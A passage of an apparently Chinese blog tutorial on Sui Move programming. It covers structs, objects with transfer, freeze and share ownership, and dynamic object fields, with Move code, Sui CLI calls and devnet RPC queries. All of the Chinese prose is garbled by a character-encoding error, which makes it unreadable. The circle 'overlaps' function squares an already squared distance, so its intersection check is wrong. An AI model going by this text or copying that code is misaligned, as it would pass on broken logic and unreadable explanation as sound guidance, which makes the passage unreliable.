class="number">7</span>, <span class="number">70</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">2</span>, <span class="number">40</span>);</span><br><span class="line">        <span class="title function_ invoke__">insert</span>(&amp;<span class="keyword">mut</span> h, <span class="number">0</span>, <span class="number">80</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">2</span>, <span class="number">60</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">1</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">0</span>, <span class="number">80</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="jie-gou-ti-struct">ç»“æ„ä½“ï¼ˆStructï¼‰</span></h3><p>Moveè¯­è¨€ä¸­ï¼Œç»“æ„ä½“æ˜¯åŒ…å«ç±»å‹åŒ–å­—æ®µçš„ç”¨æˆ·å®šä¹‰æ•°æ®ç»“æ„ã€‚ ç»“æ„å¯ä»¥å­˜å‚¨ä»»ä½•éå¼•ç”¨ç±»å‹ï¼ŒåŒ…æ‹¬å…¶ä»–ç»“æ„ã€‚ç¤ºä¾‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::structs &#123;</span><br><span class="line">    <span class="comment">// äºŒç»´å¹³é¢ç‚¹</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Point</span> has copy, drop, store &#123;</span><br><span class="line">        x: <span class="type">u64</span>,</span><br><span class="line">        y: <span class="type">u64</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åœ†</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Circle</span> has copy, drop, store &#123;</span><br><span class="line">        center: Point,</span><br><span class="line">        radius: <span class="type">u64</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ›å»ºç»“æ„ä½“</span></span><br><span class="line">    public fun <span class="title function_ invoke__">new_point</span>(x: <span class="type">u64</span>, y: <span class="type">u64</span>): Point &#123;</span><br><span class="line">        Point &#123;</span><br><span class="line">            x, y</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è®¿é—®ç»“æ„ä½“æ•°æ®</span></span><br><span class="line">    public fun <span class="title function_ invoke__">point_x</span>(p: &amp;Point): <span class="type">u64</span> &#123;</span><br><span class="line">        p.x</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun <span class="title function_ invoke__">point_y</span>(p: &amp;Point): <span class="type">u64</span> &#123;</span><br><span class="line">        p.y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">abs_sub</span>(a: <span class="type">u64</span>, b: <span class="type">u64</span>): <span class="type">u64</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line">            b - a</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            a - b</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è®¡ç®—ç‚¹ä¹‹é—´çš„è·ç¦»</span></span><br><span class="line">    public fun <span class="title function_ invoke__">dist_squared</span>(p1: &amp;Point, p2: &amp;Point): <span class="type">u64</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">dx</span> = <span class="title function_ invoke__">abs_sub</span>(p1.x, p2.x);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">dy</span> = <span class="title function_ invoke__">abs_sub</span>(p1.y, p2.y);</span><br><span class="line">        dx * dx + dy * dy</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun <span class="title function_ invoke__">new_circle</span>(center: Point, radius: <span class="type">u64</span>): Circle &#123;</span><br><span class="line">        Circle &#123; center, radius &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è®¡ç®—ä¸¤ä¸ªåœ†ä¹‹é—´æ˜¯å¦ç›¸äº¤</span></span><br><span class="line">    public fun <span class="title function_ invoke__">overlaps</span>(c1: &amp;Circle, c2: &amp;Circle): <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">d</span> = <span class="title function_ invoke__">dist_squared</span>(&amp;c1.center, &amp;c2.center);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">r1</span> = c1.radius;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">r2</span> = c2.radius;</span><br><span class="line">        d * d &lt;= r1 * r1 + <span class="number">2</span> * r1 * r2 + r2 * r2</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="dui-xiang-object">å¯¹è±¡ï¼ˆObjectï¼‰</span></h3><p>å¯¹è±¡æ˜¯ Sui Move ä¸­æ–°å¼•å…¥çš„æ¦‚å¿µï¼Œä¹Ÿæ˜¯ Sui å®‰å…¨å’Œé«˜å¹¶å‘ç­‰ä¼—å¤šç‰¹æ€§çš„åŸºç¡€ã€‚å®šä¹‰ä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦ä¸ºç»“æ„ä½“æ·»åŠ  <code>key</code> èƒ½åŠ›ï¼ŒåŒæ—¶ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªå­—æ®µå¿…é¡»æ˜¯ <code>UID</code> ç±»å‹çš„ idã€‚</p><p>å¯¹è±¡ç»“æ„ä¸­é™¤äº†å¯ä»¥ä½¿ç”¨åŸºç¡€æ•°æ®ç»“æ„å¤–ï¼Œä¹Ÿå¯ä»¥åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡ï¼Œå³å¯¹è±¡å¯ä»¥è¿›è¡ŒåŒ…è£…ï¼Œåœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ä½¿ç”¨å¦ä¸€ä¸ªå¯¹è±¡ã€‚</p><p>å¯¹è±¡æœ‰ä¸åŒçš„æ‰€æœ‰æƒå½¢å¼ï¼Œå¯ä»¥å­˜æ”¾åœ¨ä¸€ä¸ªåœ°å€ä¸‹é¢ï¼Œä¹Ÿå¯ä»¥è®¾ç½®æˆä¸å¯å˜å¯¹è±¡æˆ–è€…å…¨å±€å¯¹è±¡ã€‚ä¸å¯å˜å¯¹è±¡æ°¸è¿œä¸èƒ½è¢«ä¿®æ”¹ï¼Œè½¬ç§»æˆ–è€…åˆ é™¤ï¼Œå› æ­¤å®ƒä¸å±äºä»»ä½•äººï¼Œä½†ä¹Ÿå¯ä»¥è¢«ä»»ä½•äººè®¿é—®ã€‚æ¯”å¦‚åˆçº¦åŒ…å¯¹è±¡ï¼ŒCoin Metadata å¯¹è±¡ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>transfer</code> åŒ…ä¸­çš„æ–¹æ³•å¯¹å¯¹è±¡è¿›è¡Œå¤„ç†ï¼š</p><ul><li><code>transfer</code>ï¼šå°†å¯¹è±¡æ”¾åˆ°æŸä¸ªåœ°å€ä¸‹</li><li><code>freeze_object</code>ï¼šåˆ›å»ºä¸å¯å˜å¯¹è±¡</li><li><code>share_object</code>ï¼šåˆ›å»ºå…±äº«å¯¹è±¡</li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::objects &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;<span class="keyword">Self</span>, TxContext&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ColorObject</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        red: <span class="type">u8</span>,</span><br><span class="line">        green: <span class="type">u8</span>,</span><br><span class="line">        blue: <span class="type">u8</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">new</span>(red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>, ctx: &amp;<span class="keyword">mut</span> TxContext): ColorObject &#123;</span><br><span class="line">        ColorObject &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">new</span>(ctx),</span><br><span class="line">            red,</span><br><span class="line">            green,</span><br><span class="line">            blue,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">create</span>(red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">color_object</span> = <span class="title function_ invoke__">new</span>(red, green, blue, ctx);</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(color_object, tx_context::<span class="title function_ invoke__">sender</span>(ctx))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun <span class="title function_ invoke__">get_color</span>(<span class="keyword">self</span>: &amp;ColorObject): (<span class="type">u8</span>, <span class="type">u8</span>, <span class="type">u8</span>) &#123;</span><br><span class="line">        (<span class="keyword">self</span>.red, <span class="keyword">self</span>.green, <span class="keyword">self</span>.blue)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// Copies the values of `from_object` into `into_object`.</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">copy_into</span>(from_object: &amp;ColorObject, into_object: &amp;<span class="keyword">mut</span> ColorObject) &#123;</span><br><span class="line">        into_object.red = from_object.red;</span><br><span class="line">        into_object.green = from_object.green;</span><br><span class="line">        into_object.blue = from_object.blue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">delete</span>(object: ColorObject) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">ColorObject</span> &#123; id, red: _, green: _, blue: _ &#125; = object;</span><br><span class="line">        object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">transfer</span>(object: ColorObject, recipient: address) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(object, recipient)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">freeze_object</span>(object: ColorObject) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">freeze_object</span>(object)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">create_shareable</span>(red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">color_object</span> = <span class="title function_ invoke__">new</span>(red, green, blue, ctx);</span><br><span class="line">        transfer::<span class="title function_ invoke__">share_object</span>(color_object)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">create_immutable</span>(red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">color_object</span> = <span class="title function_ invoke__">new</span>(red, green, blue, ctx);</span><br><span class="line">        transfer::<span class="title function_ invoke__">freeze_object</span>(color_object)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">update</span>(</span><br><span class="line">        object: &amp;<span class="keyword">mut</span> ColorObject,</span><br><span class="line">        red: <span class="type">u8</span>, green: <span class="type">u8</span>, blue: <span class="type">u8</span>,</span><br><span class="line">    ) &#123;</span><br><span class="line">        object.red = red;</span><br><span class="line">        object.green = green;</span><br><span class="line">        object.blue = blue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åè°ƒç”¨ï¼š</p><ol><li>åˆ›å»ºå…±äº«å¯¹è±¡</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> create_shareable \</span><br><span class="line">  --module objects \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 1 2 3 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æœè¾“å‡º</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0x3b25eba3bf836088b56bdfd36e39ec440db8bf59 , Owner: Shared</span><br></pre></td></tr></table></figure><ol><li>åˆ›å»ºä¸å¯å˜å¯¹è±¡</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> create_immutable \</span><br><span class="line">  --module objects \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 1 2 3 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æœè¾“å‡º</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0x88f8f210635af6503a8a07835ef12e147fa60aa3 , Owner: Immutable</span><br></pre></td></tr></table></figure><ol><li>å°†å¯¹è±¡æ”¾å…¥æŸä¸ªåœ°å€ä¸‹</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> create \</span><br><span class="line">  --module objects \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 1 2 3 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æœè¾“å‡º</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0xf36144c71cde87c1e00f1bf00ee44653bc05228c , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸åŒæ‰€æœ‰æƒç±»å‹çš„å¯¹è±¡ä¼šåœ¨åˆ›å»ºæ—¶æ˜¾ç¤ºä¸åŒçš„ç±»å‹ç»“æœã€‚</p><ol><li>ä¿®æ”¹å…±äº«å¯¹è±¡æˆ–è€…æ˜¯åœ°å€æ‰€æ‹¥æœ‰çš„å¯¹è±¡ï¼šä¼ å…¥å¯¹è±¡ ID ä½œä¸ºå‚æ•°</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> update \</span><br><span class="line">  --module objects \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 0x3b25eba3bf836088b56bdfd36e39ec440db8bf59 4 5 6 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æœè¾“å‡º</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0x3b25eba3bf836088b56bdfd36e39ec440db8bf59 , Owner: Shared</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ç»“æœä¸­çœ‹åˆ° <code>Mutated Objects</code> ä¸­å¯¹è±¡å·²ç»å‘ç”Ÿäº†å˜åŒ–ã€‚</p><h3><span id="dynamic-field-he-dynamic-object-field">Dynamic field å’Œ Dynamic object field</span></h3><p>å¯¹è±¡è™½ç„¶å¯ä»¥è¿›è¡ŒåŒ…è£…ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›å±€é™ï¼Œä¸€æ˜¯å¯¹è±¡ä¸­çš„å­—æ®µæ˜¯æœ‰é™çš„ï¼Œåœ¨ç»“æ„ä½“å®šä¹‰æ˜¯å·²ç»ç¡®å®šï¼›äºŒæ˜¯åŒ…å«å…¶ä»–å¯¹è±¡çš„å¯¹è±¡å¯èƒ½éå¸¸å¤§ï¼Œå¯èƒ½ä¼šå¯¼è‡´äº¤æ˜“ gas å¾ˆé«˜ï¼ŒSui é»˜è®¤ç»“æ„ä½“å¤§å°é™åˆ¶ä¸º 2MBï¼›å†è€…ï¼Œå½“é‡åˆ°è¦å‚¨å­˜ä¸ä¸€æ ·ç±»å‹çš„å¯¹è±¡é›†åˆæ—¶ï¼Œé—®é¢˜å°±ä¼šæ¯”è¾ƒæ£˜æ‰‹ï¼ŒMove ä¸­çš„ <code>vector</code> åªèƒ½å­˜å‚¨ç›¸åŒçš„ç±»å‹çš„æ•°æ®ã€‚</p><p>å› æ­¤ï¼ŒSui æä¾›äº† dynamic fieldï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„åå­—åšå­—æ®µï¼Œä¹Ÿå¯ä»¥åŠ¨æ€æ·»åŠ å’Œåˆ é™¤ã€‚å”¯ä¸€å½±å“çš„æ˜¯ gas çš„æ¶ˆè€—ã€‚</p><p>dynamic field åŒ…å«ä¸¤ç§ç±»å‹ï¼Œfield å’Œ Object fieldï¼ŒåŒºåˆ«åœ¨äºï¼Œfield å¯ä»¥å­˜å‚¨ä»»ä½•æœ‰ <code>store</code> èƒ½åŠ›çš„å€¼ï¼Œä½†æ˜¯å¦‚æœæ˜¯å¯¹è±¡çš„è¯ï¼Œå¯¹è±¡ä¼šè¢«è®¤ä¸ºæ˜¯è¢«åŒ…è£…è€Œä¸èƒ½é€šè¿‡ ID è¢«å¤–éƒ¨å·¥å…·ï¼ˆæµè§ˆå™¨ï¼Œé’±åŒ…ç­‰ï¼‰è®¿é—®ï¼›è€Œ Object field çš„å€¼å¿…é¡»æ˜¯å¯¹è±¡ï¼ˆæœ‰ <code>key</code> èƒ½åŠ›ä¸”ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ <code>id: UID</code>ï¼‰ï¼Œå¯¹è±¡ä»ç„¶èƒ½ä»å¤–éƒ¨å·¥å…·é€šè¿‡ ID è®¿é—®ã€‚</p><p>dynamic filed çš„åç§°å¯ä»¥æ˜¯ä»»ä½•æ‹¥æœ‰ <code>copy</code>ï¼Œ<code>drop</code> å’Œ <code>store</code> èƒ½åŠ›çš„å€¼ï¼Œè¿™äº›å€¼åŒ…æ‹¬ Move ä¸­çš„åŸºæœ¬ç±»å‹ï¼ˆæ•´æ•°ï¼Œå¸ƒå°”å€¼ï¼Œå­—èŠ‚ä¸²ï¼‰ï¼Œä»¥åŠæ‹¥æœ‰ <code>copy</code>ï¼Œ<code>drop</code> å’Œ <code>store</code> èƒ½åŠ›çš„ç»“æ„ä½“ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¾‹å­æ¥çœ‹çœ‹å…·ä½“çš„æ“ä½œï¼š</p><ul><li>æ·»åŠ å­—æ®µï¼š <code>add</code></li><li>è®¿é—®å’Œä¿®æ”¹å­—æ®µï¼š <code>borrow</code>ï¼Œ <code>borow_mut</code></li><li>åˆ é™¤å­—æ®µ</li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::fields &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::dynamic_object_field <span class="keyword">as</span> dof;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;<span class="keyword">Self</span>, TxContext&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Parent</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Child</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        count: <span class="type">u64</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">initialize</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(Parent &#123; id: object::<span class="title function_ invoke__">new</span>(ctx) &#125;, tx_context::<span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(Child &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), count: <span class="number">0</span> &#125;, tx_context::<span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">add_child</span>(parent: &amp;<span class="keyword">mut</span> Parent, child: Child) &#123;</span><br><span class="line">        dof::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> parent.id, <span class="string">b&quot;child&quot;</span>, child);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">mutate_child</span>(child: &amp;<span class="keyword">mut</span> Child) &#123;</span><br><span class="line">        child.count = child.count + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">mutate_child_via_parent</span>(parent: &amp;<span class="keyword">mut</span> Parent) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mutate_child</span>(dof::borrow_mut&lt;vector&lt;<span class="type">u8</span>&gt;, Child&gt;(</span><br><span class="line">            &amp;<span class="keyword">mut</span> parent.id,</span><br><span class="line">            <span class="string">b&quot;child&quot;</span>,</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">delete_child</span>(parent: &amp;<span class="keyword">mut</span> Parent) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">Child</span> &#123; id, count: _ &#125; = dof::remove&lt;vector&lt;<span class="type">u8</span>&gt;, Child&gt;(</span><br><span class="line">            &amp;<span class="keyword">mut</span> parent.id,</span><br><span class="line">            <span class="string">b&quot;child&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">reclaim_child</span>(parent: &amp;<span class="keyword">mut</span> Parent, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">child</span> = dof::remove&lt;vector&lt;<span class="type">u8</span>&gt;, Child&gt;(</span><br><span class="line">            &amp;<span class="keyword">mut</span> parent.id,</span><br><span class="line">            <span class="string">b&quot;child&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(child, tx_context::<span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¹¶è°ƒç”¨ <code>initialize</code> å’Œ <code>add_child</code> æ–¹æ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> initialize \</span><br><span class="line">  --module fields \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0x55536ca8123ffb606398da9f7d2472888ca5bfd1 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br><span class="line">  - ID: 0xf1206f0f7d97908aae907c23d69a4cd97120dc82 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> add_child \</span><br><span class="line">  --module fields \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args 0xf1206f0f7d97908aae907c23d69a4cd97120dc82 0x55536ca8123ffb606398da9f7d2472888ca5bfd1 --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0xdf694f282f739f328325bc922b3083bd45f31cae , Owner: Object ID: ( 0xf1206f0f7d97908aae907c23d69a4cd97120dc82 )</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0x55536ca8123ffb606398da9f7d2472888ca5bfd1 , Owner: Object ID: ( 0xdf694f282f739f328325bc922b3083bd45f31cae )</span><br><span class="line">  - ID: 0xf1206f0f7d97908aae907c23d69a4cd97120dc82 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ <code>sui_getDynamicFields</code> æ–¹æ³•æŸ¥çœ‹æ·»åŠ çš„å­—æ®µï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> https://fullnode.devnet.sui.io:443 -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;sui_getDynamicFields&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;:[</span></span><br><span class="line"><span class="string">      &quot;0xf1206f0f7d97908aae907c23d69a4cd97120dc82&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vector[99u8, 104u8, 105u8, 108u8, 100u8]&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DynamicObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;objectType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xee2961ee26916285ebef57c68caaa5f67a3d8dbd::fields::Child&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;objectId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x55536ca8123ffb606398da9f7d2472888ca5bfd1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">1621</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GNSaPghN+tRBkxKiVhQCn9jVBkjYV4RU4oF+c4CUGJM=&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nextCursor&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>name</code> ä¸º <code>â€œchildâ€</code> ã€‚åŒæ—¶ï¼Œå¯¹äºå¯¹è±¡ ID <code>0x55536ca8123ffb606398da9f7d2472888ca5bfd1</code>ï¼Œæˆ‘ä»¬ä»ç„¶èƒ½ä»é“¾ä¸Šè¿½è¸ªå¯¹åº”ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> https://fullnode.devnet.sui.io:443 -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;method&quot;: &quot;sui_getObject&quot;,</span></span><br><span class="line"><span class="string">  &quot;params&quot;:[</span></span><br><span class="line"><span class="string">      &quot;0x55536ca8123ffb606398da9f7d2472888ca5bfd1&quot;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="ji-he-shu-ju-lei-xing">é›†åˆæ•°æ®ç±»å‹</span></h3><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»‹ç»å‡ ç§åŸºäº dynamic field 